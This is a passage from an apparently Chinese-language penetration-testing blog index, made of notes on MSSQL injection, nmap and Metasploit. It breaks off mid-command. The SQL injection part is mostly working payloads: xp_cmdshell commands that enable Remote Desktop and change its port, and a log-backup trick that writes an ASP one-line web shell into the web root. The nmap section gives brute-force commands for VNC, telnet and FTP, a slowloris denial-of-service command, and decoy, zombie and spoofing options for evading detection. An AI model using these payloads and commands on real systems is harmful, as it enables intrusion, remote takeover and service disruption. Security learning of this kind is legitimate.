class="line">;exec master..xp_cmdshell &#x27;net start termservice&#x27; </span><br><span class="line">;exec master..xp_cmdshell &#x27;reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0x0 /f&#x27;  </span><br><span class="line">//允许外部连接 </span><br><span class="line">;exec master..xp_cmdshell &#x27;reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal</span><br><span class="line">Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x50 /f&#x27;    //改端口到80</span><br><span class="line">开启3389</span><br><span class="line">;exec master..xp_cmdshell &quot;wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 1&quot;--</span><br></pre></td></tr></table></figure><h2 id="dbowner权限利用"><a href="#dbowner权限利用" class="headerlink" title="dbowner权限利用"></a>dbowner权限利用</h2></li></ul><ol><li>判断数据库用户权限 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=(select is_member(&#x27;db_owner&#x27;));--</span><br></pre></td></tr></table></figure></li><li>搜索web目录 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;create table temp(dir nvarchar(255),depth varchar(255),files varchar(255),ID int NOT NULL IDENTITY(1,1));--</span><br></pre></td></tr></table></figure>然后 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;insert into temp(dir,depth,files)exec master.dbo.xp_dirtree &#x27;c:&#x27;,1,1--</span><br></pre></td></tr></table></figure>由于不能一次性获取所有目录文件和文件夹名，因此需要更改ID的值，依次列出文件和文件夹<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(select dir from temp where id=1)&gt;0</span><br></pre></td></tr></table></figure><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2></li></ol><ul><li>找到web目录后，就可以写入一句话木马了 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">;alter database ssdown5 set RECOVERY FULL </span><br><span class="line">;create table test(str image)-- </span><br><span class="line">;backup log ssdown5 to disk=&#x27;c:\test&#x27; with init-- </span><br><span class="line">;insert into test(str)values (&#x27;&lt;%excute(request(&quot;cmd&quot;))%&gt;&#x27;)-- </span><br><span class="line">;backup log ssdown5 to disk=&#x27;c:\inetpub\wwwroot\x.asp&#x27;-- </span><br><span class="line">;alter database ssdown5 set RECOVERY simple</span><br></pre></td></tr></table></figure></li></ul><h1 id="SqlServer-工具使用"><a href="#SqlServer-工具使用" class="headerlink" title="SqlServer 工具使用"></a>SqlServer 工具使用</h1><p>穿山甲、萝卜头、sqlmap等</p>]]></content>
      
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmap</title>
      <link href="/archives/96512c85.html"/>
      <url>/archives/96512c85.html</url>
      
        <content type="html"><![CDATA[<h1 id="端口扫描之王———-NMAP"><a href="#端口扫描之王———-NMAP" class="headerlink" title="端口扫描之王———-NMAP"></a>端口扫描之王———-NMAP</h1><ul><li>Nmap是一款非常强大的实用工具,可用于：检测活在网络上的主机（主机发现）检测主机上开放的端口（端口发现或枚举）检测到相应的端口（服务发现）的软件和版本检测操作系统，硬件地址，以及软件版本检测脆弱性的漏洞（Nmap的脚本）Nmap是一个非常普遍的工具，它有命令行界面和图形用户界面。本人包括以下方面的内容:介绍Nmap扫描中的重要参数操作系统检测Nmap使用教程Nmap使用不同的技术来执行扫描，包括：TCP的connect（）扫描，TCP反向的ident扫描，FTP反弹扫描等。所有这些扫描的类型有自己的优点和缺点，我们接下来将讨论这些问题。 Nmap的使用取决于目标主机,因为有一个简单的（基本）扫描和预先扫描之间的差异。我们需要使用一些先进的技术来绕过防火墙和入侵检测&#x2F;防御系统，以获得正确的结果。<h1 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h1>扫描单个主机<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1.2</span><br></pre></td></tr></table></figure>扫描整个子网,命令如下:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1.1/24</span><br></pre></td></tr></table></figure>扫描多个目标,命令如下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1.2 192.168.1.5</span><br></pre></td></tr></table></figure>扫描一个范围内的目标,如下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1.1-100 (扫描IP地址为192.168.1.1-192.168.1.100内的所有主机)</span><br></pre></td></tr></table></figure>如果你有一个ip地址列表，将这个保存为一个txt文件，和namp在同一目录下,扫描这个txt内的所有主机，命令如下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -iL target.txt</span><br></pre></td></tr></table></figure></li></ul><p>如果你想看到你扫描的所有主机的列表，用以下命令:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sL 192.168.1.1/24</span><br></pre></td></tr></table></figure><p>扫描除过某一个ip外的所有子网主机,命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1.1/24 -exclude 192.168.1.1</span><br></pre></td></tr></table></figure><p>扫描除过某一个文件中的ip外的子网主机命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1.1/24 -excludefile xxx.txt(xxx.txt中的文件将会从扫描的主机中排除)</span><br></pre></td></tr></table></figure><h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>常用命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -F -sT -v nmap.org</span><br></pre></td></tr></table></figure><p>-F：扫描100个最有可能开放的端口   -v 获取扫描的信息   -sT：采用的是TCP扫描 不写也是可以的，默认采用的就是TCP扫描<br>-p: 指定要扫描的端口<br>-p: 80,90,3306,10-100</p><h2 id="扫描端口状态"><a href="#扫描端口状态" class="headerlink" title="扫描端口状态"></a>扫描端口状态</h2><ul><li><p>Open：端口处于开放状态，例如：当nmap使用TCP SYN对目标主机某一范围的端口进行扫描时，我们知道 TCP SYN报文是TCP建立连接的第一步，所以，如果目标主机返回SYN+ACK的报文，我们就认为此端口开放了并且使用了TCP服务。</p></li><li><p>Closed：端口处于关闭状态。例如：TCP SYN类型的扫描，如果返回RST类型的报文，则端口处于管理状态。这里我们值得注意的是关闭的端口也是可访问的，只是没有上层的服务在监听这个端口，而且，只是在我们扫描的这个时刻为关闭，当我们在另一个时间段进行扫描的时候，这些关闭的端口可能会处于open的状态。</p></li><li><p>Filtered（过滤的）：由于报文无法到达指定的端口，nmap不能够决定端口的开放状态，这主要是由于网络或者主机安装了一些防火墙所导致的。当nmap收到icmp报文主机不可达报文（例如：type为3，code为13（communication administratively prohibit）报文）或者目标主机无应答，常常会将目标主机的状态设置为filtered。</p></li><li><p>Unfiltered（未被过滤的）：当nmap不能确定端口是否开放的时候所打上的状态，这种状态和filtered的区别在于：unfiltered的端口能被nmap访问，但是nmap根据返回的报文无法确定端口的开放状态，而filtered的端口直接就没就没能够被nmap访问。端口被定义为Unfilterd只会发生在TCP ack扫描类型时当返回RST的报文。而端口被定义为filtered 状态的原因是是报文被防火墙设备，路由器规则，或者防火墙软件拦截，无法送达到端口，这通常表现为发送NMAP的主机收到ICMP报错报文，如：TYPE为3，code为13的报文（通信被认为的禁止 communication administratively prohibited），或者主机通过多次重复发送没有收到任何回应）。</p></li><li><p>Open|filtered状态，这种状态主要是nmap无法区别端口处于open状态还是filtered状态。这种状态只会出现在open端口对报文不做回应的扫描类型中，如：udp，ip protocol ，TCP null，fin，和xmas扫描类型。</p></li><li><p>Closed|filtered状态，这种状态主要出现在nmap无法区分端口处于closed还是filtered时。此状态只会出现在IP ID idle scan（这个类型我现在也不太理解，过段时间进行总结一些）中。</p></li></ul><h1 id="TCP扫描（-sT）"><a href="#TCP扫描（-sT）" class="headerlink" title="TCP扫描（-sT）"></a>TCP扫描（-sT）</h1><ul><li><p>这是一种最为普通的扫描方法，这种扫描方法的特点是：扫描的速度快，准确性高，对操作者没有权限上的要求，但是容易被防火墙和IDS(防入侵系统)发现</p></li><li><p>运行的原理：通过建立TCP的三次握手连接来进行信息的传递</p></li><li><p>Client端发送SYN</p></li><li><p>Server端返回SYN&#x2F;ACK，表明端口开放</p></li><li><p>Client端返回ACK，表明连接已建立</p></li><li><p>Client端主动断开连接。</p></li></ul><h1 id="SYN扫描（-sS）"><a href="#SYN扫描（-sS）" class="headerlink" title="SYN扫描（-sS）"></a>SYN扫描（-sS）</h1><ul><li>这是一种秘密的扫描方式之一，因为在SYN扫描中Client端和Server端没有形成3次握手，所以没有建立一个正常的TCP连接，因此不被防火墙和日志所记录，一般不会再目标主机上留下任何的痕迹，但是这种扫描是需要root权限（对于windows用户来说，是没有root权限这个概念的，root权限是linux的最高权限，对应windows的管理员权限）</li></ul><h1 id="端口扫描-1"><a href="#端口扫描-1" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>使用UDP ping探测主机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -PU 192.168.1.0/24</span><br></pre></td></tr></table></figure><p>服务版本探测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.1.1</span><br></pre></td></tr></table></figure><p>精准地确认端口上运行的服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV --script unusual-port 192.168.1.1</span><br></pre></td></tr></table></figure><h1 id="探测目标主机的操作系统"><a href="#探测目标主机的操作系统" class="headerlink" title="探测目标主机的操作系统"></a>探测目标主机的操作系统</h1><ul><li><p>OS操作系统类型的探测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O 192.168.1.19</span><br></pre></td></tr></table></figure></li><li><p>osscan-guess 猜测匹配操作系统 (猜测认为最接近目标的匹配操作系统类型。)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O --osscan-guess 192.168.1.180</span><br></pre></td></tr></table></figure></li><li><p>如果远程主机有防火墙，IDS和IPS系统，你可以使用-PN命令来确保不ping远程主机，因为有时候防火墙会阻止掉ping请求.-PN命令告诉Nmap不用ping远程主机。使用-PN参数可以绕过PING命令,但是不影响主机的系统的发现。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O -PN 192.168.1.180</span><br></pre></td></tr></table></figure></li><li><p>全面扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.1.19</span><br></pre></td></tr></table></figure></li></ul><h1 id="nmap-信息收集脚本"><a href="#nmap-信息收集脚本" class="headerlink" title="nmap 信息收集脚本"></a>nmap 信息收集脚本</h1><img src="/img/nmap脚本.png"><p>对目标进行IP反查</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn --script hostmap-ip2hosts www.hao123.com</span><br></pre></td></tr></table></figure><p>对目标DNS信息的收集</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script dns-brute www.test.com</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script dns-brute dns-brute.threads=10 www.test.com</span><br></pre></td></tr></table></figure><p>了解目标系统的详细信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 445 192.168.23.1 --script membase-http-info</span><br></pre></td></tr></table></figure><h1 id="nmap-信息收集"><a href="#nmap-信息收集" class="headerlink" title="nmap 信息收集"></a>nmap 信息收集</h1><p>检查打印服务漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script smb-security-mode.nse -p 445 192.168.21.3</span><br></pre></td></tr></table></figure><p>扫描目标的xss漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p80 --script http-stored-xss.nse www.test.com</span><br></pre></td></tr></table></figure><p>扫描目标的SQL注入漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p8001 --script http-sql-injection.nse 192.168.0.200</span><br></pre></td></tr></table></figure><p>对目标地址进行HTTP头信息探测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 80 --script=http-headers test.com</span><br></pre></td></tr></table></figure><p>爬行web目录结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 80 --script=http-sitemap-generator www.test.com</span><br></pre></td></tr></table></figure><p>Snmp服务获取目标正在运行着的服务，通过Snmp服务对目标系统的服务或账户进行列举</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU -p 161 --script=snmp-win32-services 192.168.87.129</span><br></pre></td></tr></table></figure><h1 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h1><p>暴力破解VNC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script vnc-brute --script-args brute.guesses=6,brute.emptypass=true,userdb=/root/dictionary/user.txt,brute.useraspass=true,passdb=/root/dictionary/pass.txt,brute.retries=3,brute.threads=2,brute.delay=3 42.96.170.128</span><br></pre></td></tr></table></figure><p>破解telnet</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 23 --script telnet-brute --script-args userdb=myusers.lst,passdb=mypwds.lst --script-args telnet-brute.timeout=8s 192.168.1.1</span><br></pre></td></tr></table></figure><p>ftp弱口令暴力破解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --script ftp-brute --script-args brute.emptypass=true,ftp-brute.timeout=30,userdb=/root/dirtionary/usernames.txt,brute.useraspass=true,passdb=/root/dirtionary/passwords.txt,brute.threads=3,brute.delay=6 192.168.1.1</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h1><p>扫描系统漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script vuln 192.168.1.1</span><br></pre></td></tr></table></figure><p>IIS 短文件泄露</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 8080 --script http-iis-short-name-brute 192.168.1.1</span><br></pre></td></tr></table></figure><p>拒绝服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --max-parallelism 800--script http-slowloris www.xxxxx.com</span><br></pre></td></tr></table></figure><p>验证http 中开启了put 方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script http-put --script-args http-put.url=/uploads/testput.txt,http-put.file=/root/put.txt 218.19.141.16</span><br></pre></td></tr></table></figure><p>验证MySQL 匿名访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script mysql-empty-password 203.195.139.153</span><br></pre></td></tr></table></figure><h1 id="防火墙躲避"><a href="#防火墙躲避" class="headerlink" title="防火墙躲避"></a>防火墙躲避</h1><p>-f 分片绕过<br>-D 使用诱饵隐蔽扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NMAP -D 1.1.1.1,222.222.222.222 www.xxxxx.com</span><br></pre></td></tr></table></figure><p>–source-port  源端口欺骗</p><h1 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h1><p>侦测服务版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt</span><br></pre></td></tr></table></figure><p>扫做系统扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt</span><br></pre></td></tr></table></figure><p>系统和服务检测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect-iL LiveHosts.txt</span><br></pre></td></tr></table></figure><p>修改默认MTU 大小，但必须为8 的倍数(8,16,24,32等等)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --mtu 24</span><br></pre></td></tr></table></figure><p>生成随机数量的欺骗</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -D RND:10 [target]</span><br></pre></td></tr></table></figure><p>手动指定欺骗使用的IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -D decoy1,decoy2,decoy3 etc.</span><br></pre></td></tr></table></figure><p>僵尸网络扫描,首先需要找到僵尸网络的IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sI [Zombie IP] [Target IP]</span><br></pre></td></tr></table></figure><p>指定源端口号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --source-port 80 IP</span><br></pre></td></tr></table></figure><p>在每个扫描数据包后追加随机数量的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --data-length 25IP</span><br></pre></td></tr></table></figure><p>MAC 地址欺骗，可以生成不同主机的MAC 地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --spoof-mac Dell/Apple/3Com IP</span><br></pre></td></tr></table></figure><h1 id="导出格式"><a href="#导出格式" class="headerlink" title="导出格式"></a>导出格式</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-oS (ScRipT KIdd|3oUTpuT)保存扫描结果输出。</span><br><span class="line">-oN 按照人们阅读的格式记录屏幕上的输出，如果是在扫描多台机器，则该选项很有用。</span><br><span class="line">-oX 以xml格式向指定的文件记录信息</span><br><span class="line">-oG 以一种易于检索的格式记录信息，即每台主机都以单独的行来记录所有的端口和0s信息。-oS 把输出进行傻瓜型排版</span><br><span class="line">-oA 导出所有格式。普通格式(-oN)、XML格式(-oX)和易于检索的格式（-oG）jilu xinxi</span><br></pre></td></tr></table></figure><h1 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h1><img src="/img/微信图片_20220728172112.jpg">]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>metasploit</title>
      <link href="/archives/71f4c5ab.html"/>
      <url>/archives/71f4c5ab.html</url>
      
        <content type="html"><![CDATA[<h1 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h1><ul><li>Metasploit就是一个漏洞框架。它的全称叫做The Metasploit Framework，简称叫做MSF。Metasploit作为全球最受欢迎的工具，不仅仅是因为它的方便性和强大性，更重要的是它的框架。它允许使用者开发自己的漏洞脚本，从而进行测试。</li><li>本人使用环境 kali<h1 id="涉及专业术语"><a href="#涉及专业术语" class="headerlink" title="涉及专业术语"></a>涉及专业术语</h1></li><li>渗透攻击（exploit）:<br>测试者利用系统，程序，或服务的漏洞进行攻击的一个过程。</li><li>攻击载荷（payload）:<br>攻击者在目标系统上执行的一段攻击代码，该代码具有返弹连接，创建用户，执行其他系统命令的功能</li><li>shellcode:<br>在目标机器上运行的一段机器指令，成功执行后会返回一个shell</li><li>模块（module）:<br>是指Metasploit框架中所使用的一段软件代码组件。</li><li>监听器（listener）:<br>监听器是metasploit中用来等待介入网络连接的组件。</li></ul><h1 id="MSF基础知识"><a href="#MSF基础知识" class="headerlink" title="MSF基础知识"></a>MSF基础知识</h1><ul><li>运行 <code>msfconsole</code> 即可打开msf命令控制接口.</li><li>当打开msfconsole后，这里面清楚的标记了Metasploit所有的利用模块、payload等等.</li><li><code>Help</code>参数</li></ul><h1 id="启动设置"><a href="#启动设置" class="headerlink" title="启动设置"></a>启动设置</h1><ul><li>注意: kali 更新后命令有变动;这是因为kali新版进行了更新。</li><li>查看版本 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsb_release -a   </span><br></pre></td></tr></table></figure></li><li>本人使用版本 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Kali</span><br><span class="line">Description:    Kali GNU/Linux Rolling</span><br><span class="line">Release:        2022.3</span><br><span class="line">Codename:       kali-rolling</span><br></pre></td></tr></table></figure></li></ul><h2 id="正确的使用方法是："><a href="#正确的使用方法是：" class="headerlink" title="正确的使用方法是："></a>正确的使用方法是：</h2><ol><li>启动postgresql:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service postgresql start</span><br></pre></td></tr></table></figure></li><li>初始化metasploit postgresql数据库</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfdb init</span><br></pre></td></tr></table></figure><ol start="3"><li>启动msfconsole：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure></li><li>输入<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">db_status</span><br><span class="line"></span><br><span class="line">* 失败:postgresql selected, no connection.</span><br><span class="line">* 成功:Connected to msf. Connection type: postgresql.</span><br></pre></td></tr></table></figure></li></ol><ul><li>在kali中metasploit默认使用postgresql作为它的数据库；</li><li>默认创建的数据库名：msf，msf_test;用户名：msf；口令默认为空<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[+] Creating databases &#x27;msf&#x27;</span><br><span class="line">[+] Creating databases &#x27;msf_test&#x27;</span><br><span class="line">[+] Creating configuration file &#x27;/usr/share/metasploit-framework/config/database.yml&#x27;</span><br><span class="line">[+] Creating initial database schema</span><br></pre></td></tr></table></figure></li></ul><h1 id="模块介绍"><a href="#模块介绍" class="headerlink" title="模块介绍"></a>模块介绍</h1><ul><li>渗透模块：exploit（漏洞利用） 利用目标的安全漏洞进行攻击</li><li>攻击载荷模块：payload  成功在对方目标渗透后，开始在目标计算机运行，帮助目标系统上获取访问行动权限</li><li>辅助功能： auxiliary  辅助支持模块，扫描模块，fuzz测试、发掘、欺骗</li><li>编码器模块：encoder  用对攻击模块进行代码混淆，逃过目标检测</li><li>Meterpreter:  使用内存技术攻击载荷，可注入到进程中</li><li>post模块：后渗透模块</li><li>post模块：提升用户权限       检查系统凭据（口令） </li><li>窃取用户cookies和保存的口令     键盘捕获 <h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="whois查询："><a href="#whois查询：" class="headerlink" title="whois查询："></a>whois查询：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; whois putdown.top</span><br><span class="line">msf &gt; whois 192.168.1.100</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="nmap-连接数据库："><a href="#nmap-连接数据库：" class="headerlink" title="nmap 连接数据库："></a>nmap 连接数据库：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; db_nmap –sS –A putdown.top</span><br><span class="line">msf&gt; db_services #查看扫描结</span><br></pre></td></tr></table></figure><h2 id="高级扫描方式："><a href="#高级扫描方式：" class="headerlink" title="高级扫描方式："></a>高级扫描方式：</h2><ul><li>IPID序列扫描器，与 nmap的-sI -O选项类似 （ RHOSTS、 RPORT等参数也可以用小写）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use auxiliary/scanner/ip/ipidseq </span><br><span class="line">show options </span><br><span class="line">set RHOSTS 192.168.1.0/24 </span><br><span class="line">set RPORT 8080 </span><br><span class="line">set THREADS 50 </span><br><span class="line">run</span><br></pre></td></tr></table></figure><h2 id="portscan模块"><a href="#portscan模块" class="headerlink" title="portscan模块"></a>portscan模块</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; search postscan</span><br><span class="line">msf&gt; use auxiliary/scanner/postscan/syn</span><br><span class="line">set RHOSTS 192.168.1.111</span><br><span class="line">setTHREADS 50</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h2 id="特定扫描"><a href="#特定扫描" class="headerlink" title="特定扫描"></a>特定扫描</h2>smb_version 模块：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use auxiliary/scanner/smb/smb_version</span><br><span class="line">showoptions</span><br><span class="line">set RHOSTS 192.168.1.111</span><br><span class="line">run</span><br><span class="line">db_hosts –c address,os_flavor</span><br></pre></td></tr></table></figure><h2 id="找-mssql-主机："><a href="#找-mssql-主机：" class="headerlink" title="找 mssql 主机："></a>找 mssql 主机：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use auxiliary/scanner/mssql/mssql_ping</span><br><span class="line">showoptions</span><br><span class="line">set RHOSTS 192.168.1.0/24</span><br><span class="line">setTHREADS 255</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h2 id="SSH-服务器扫描："><a href="#SSH-服务器扫描：" class="headerlink" title="SSH 服务器扫描："></a>SSH 服务器扫描：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use auxiliary/scanner/ssh/ssh_version</span><br><span class="line">set RHOSTS 192.168.1.0/24</span><br><span class="line">setTHREADS 50</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h2 id="Telnet服务器扫描："><a href="#Telnet服务器扫描：" class="headerlink" title="Telnet服务器扫描："></a>Telnet服务器扫描：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use 